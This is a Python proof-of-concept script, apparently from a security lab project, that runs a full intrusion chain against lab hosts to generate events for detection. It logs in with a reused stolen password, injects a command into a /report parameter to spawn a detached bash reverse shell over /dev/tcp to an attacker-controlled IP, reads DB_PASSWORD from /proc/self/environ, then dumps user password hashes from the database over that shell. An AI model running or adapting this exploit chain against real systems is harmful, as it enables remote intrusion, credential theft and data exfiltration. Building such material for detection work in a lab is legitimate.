#!/usr/bin/env python3
"""
Threat 3 (APT) proof-of-concept -- the CORRELATION kill chain.

Run from attacker-01.inet. Talks to the only exposed surface (lb-01:80) for the
foothold, then drives everything else over a reverse shell, exactly as a real
intruder would: the attacker's box never touches the internal network directly
(the firewall blocks inet -> internal; see docs/architecture.md).

Chain (each stage leaves a DIFFERENT signal -- that is the whole point of APT:
no single alert proves it, the chain does):

  1. INITIAL ACCESS   login as bob:password123 -- the credential stolen in
                      threat 2 (reuse). Gives the session /report requires.
  2. EXECUTION + C2   GET /report?sensor=...  command injection (SSLE_VULNERABLE)
                      spawns a detached reverse shell  api-01 -> attacker:443.
  3. DISCOVERY        over the shell: id/hostname, then a blocked probe to
                      db-01:22 (dropped by the firewall -> a drop-log signal).
  4. CRED ACCESS      re-read /proc/self/environ from inside the shell; the DB
                      password is lying in the gunicorn process environment.
  5. COLLECTION/EXFIL from api-01, psycopg2 -> db-01, dump the users table
                      (password hashes) + a readings count, over the C2 channel.

Stdlib only (urllib + socket + threads), same as scripts/credstuffing.py.
Nothing here is novel offence; it is a textbook chain wired to our lab so the
detection in docs/threats/apt.md has real events to correlate.
"""
import argparse
import json
import socket
import sys
import threading
import time
import urllib.request
import urllib.parse
from datetime import datetime, timezone

# A sentinel appended after every remote command so we can read deterministically
# over the (dumb, non-TTY) socket instead of guessing at timing.
MARK = "__SSLE_APT__"


def ts() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S")


def log(msg: str, transcript: list) -> None:
    line = f"[{ts()}] {msg}"
    print(line, flush=True)
    transcript.append(line)


# --- stage 1: initial access -------------------------------------------------
def login(target: str, user: str, pw: str, transcript: list) -> str:
    """Return the Cookie header value (session=...) after logging in via lb-01."""
    body = json.dumps({"username": user, "password": pw}).encode()
    req = urllib.request.Request(
        f"{target}/login", data=body,
        headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=10) as r:
        cookie = r.headers.get("Set-Cookie", "")
        session = cookie.split(";", 1)[0] if cookie else ""
    if not session:
        log(f"STAGE 1 FAILED: no session cookie for {user} (locked? wrong pw?)", transcript)
        sys.exit(1)
    log(f"STAGE 1  initial access: logged in as '{user}' (reused credential) -> {session}", transcript)
    return session


# --- stage 2: command injection that calls back ------------------------------
def fire_payload(target: str, session: str, lhost: str, lport: int, transcript: list) -> None:
    """GET /report with a sensor value that injects a detached reverse shell."""
    # setsid + background + fds away from the captured pipe so gunicorn's
    # subprocess.run(timeout=5) returns immediately while the shell lives on.
    # Trailing '#' comments out the "; date -u" the vulnerable code appends
    # after our value -- otherwise "... & ; date -u" is a bash syntax error.
    # Non-interactive bash (no -i): no prompt, no input echo, so the sentinel
    # framing in run() stays in sync. Still a reverse shell, still an anomalous
    # bash process + outbound connection for detection to catch.
    shell = (f"bash >& /dev/tcp/{lhost}/{lport} 0>&1")
    sensor = f"x; setsid bash -c '{shell}' >/dev/null 2>&1 </dev/null & #"
    url = f"{target}/report?" + urllib.parse.urlencode({"sensor": sensor})
    req = urllib.request.Request(url, headers={"Cookie": session})
    log(f"STAGE 2  injecting reverse shell via /report  (sensor=<{len(sensor)} bytes>)", transcript)
    with urllib.request.urlopen(req, timeout=10) as r:
        _ = r.read()
    log("STAGE 2  /report returned; shell should be dialing back", transcript)


# --- stages 3-5: drive the shell --------------------------------------------
def run(sock: socket.socket, cmd: str, transcript: list, quiet: bool = False) -> str:
    """Send one command, read until the sentinel, return the output."""
    sock.sendall((f"{cmd}; echo {MARK}$?\n").encode())
    buf = b""
    sock.settimeout(8)
    try:
        while MARK.encode() not in buf:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    text = buf.decode(errors="replace")
    body = text.split(MARK, 1)[0].strip()
    if not quiet:
        transcript.append(f"    $ {cmd}")
        for line in body.splitlines():
            transcript.append(f"      {line}")
    return body


def drive(sock: socket.socket, dbpw_holder: dict, transcript: list) -> None:
    # stage 3: who/where am I, then a blocked lateral probe
    log("STAGE 3  discovery (foothold identity + blocked recon)", transcript)
    run(sock, "id; hostname; echo cwd=$PWD", transcript)
    run(sock, "timeout 3 bash -c 'echo > /dev/tcp/10.10.1.41/22' 2>&1; "
              "echo 'probe db-01:22 rc='$?  '(124=dropped by firewall)'", transcript)

    # stage 4: credential access -- DB password from the process environment
    log("STAGE 4  credential access (read DB_PASSWORD from the process env)", transcript)
    env = run(sock, "cat /proc/self/environ | tr '\\0' '\\n' | grep -E 'DB_|SECRET'", transcript)
    for line in env.splitlines():
        if line.startswith("DB_PASSWORD="):
            dbpw_holder["pw"] = line.split("=", 1)[1].strip()
    log(f"STAGE 4  captured DB_PASSWORD = {dbpw_holder.get('pw', '<not found>')}", transcript)

    # stage 5: pivot to the DB with the stolen creds and exfil the crown jewels
    log("STAGE 5  collection/exfil (api-01 -> db-01, dump users + readings)", transcript)
    pw = dbpw_holder.get("pw", "")
    py = (
        "python3 -c \""
        "import psycopg2;"
        f"c=psycopg2.connect(host='db-01.avr.pt.ssle',dbname='ssle',user='api',password='{pw}');"
        "cur=c.cursor();"
        "cur.execute('select current_user, inet_server_addr()');print('connected as',cur.fetchone());"
        "cur.execute('select username,left(password_hash,30)||chr(8230) from users order by username');"
        "[print(' ',r[0],r[1]) for r in cur.fetchall()];"
        "cur.execute('select count(*) from readings');print('readings rows:',cur.fetchone()[0])\""
    )
    run(sock, py, transcript)
    run(sock, "exit", transcript, quiet=True)


def listener(lport: int, got_conn: threading.Event, dbpw_holder: dict, transcript: list) -> None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(1)
    srv.settimeout(20)
    log(f"C2 listener on 0.0.0.0:{lport}, waiting for api-01 to call back...", transcript)
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        log("C2 FAILED: no callback within 20s (egress blocked? payload failed?)", transcript)
        got_conn.set()
        return
    log(f"C2  reverse shell connected from {addr[0]}:{addr[1]}", transcript)
    time.sleep(0.5)  # let bash -i settle
    try:
        drive(conn, dbpw_holder, transcript)
    finally:
        conn.close()
        srv.close()
        got_conn.set()


def main() -> None:
    ap = argparse.ArgumentParser(description="APT kill-chain PoC (run from attacker-01)")
    ap.add_argument("--target", default="http://192.168.100.10", help="lb-01 URL")
    ap.add_argument("--user", default="bob", help="stolen username (threat 2)")
    ap.add_argument("--password", default="password123", help="stolen password")
    ap.add_argument("--lhost", default="192.168.100.66", help="attacker IP the shell calls back to")
    ap.add_argument("--lport", type=int, default=443, help="C2 port (allowed by the apt egress rule)")
    ap.add_argument("--out", default="", help="write the transcript to this file")
    args = ap.parse_args()

    transcript: list = [f"# APT kill-chain PoC  {datetime.now(timezone.utc).isoformat()}"]
    dbpw_holder: dict = {}
    got_conn = threading.Event()

    t = threading.Thread(target=listener, args=(args.lport, got_conn, dbpw_holder, transcript), daemon=True)
    t.start()
    time.sleep(0.5)

    session = login(args.target, args.user, args.password, transcript)
    fire_payload(args.target, session, args.lhost, args.lport, transcript)

    got_conn.wait(timeout=40)
    time.sleep(0.3)
    log("chain complete", transcript)

    if args.out:
        with open(args.out, "w") as f:
            f.write("\n".join(transcript) + "\n")
        print(f"\ntranscript written to {args.out}", flush=True)


if __name__ == "__main__":
    main()
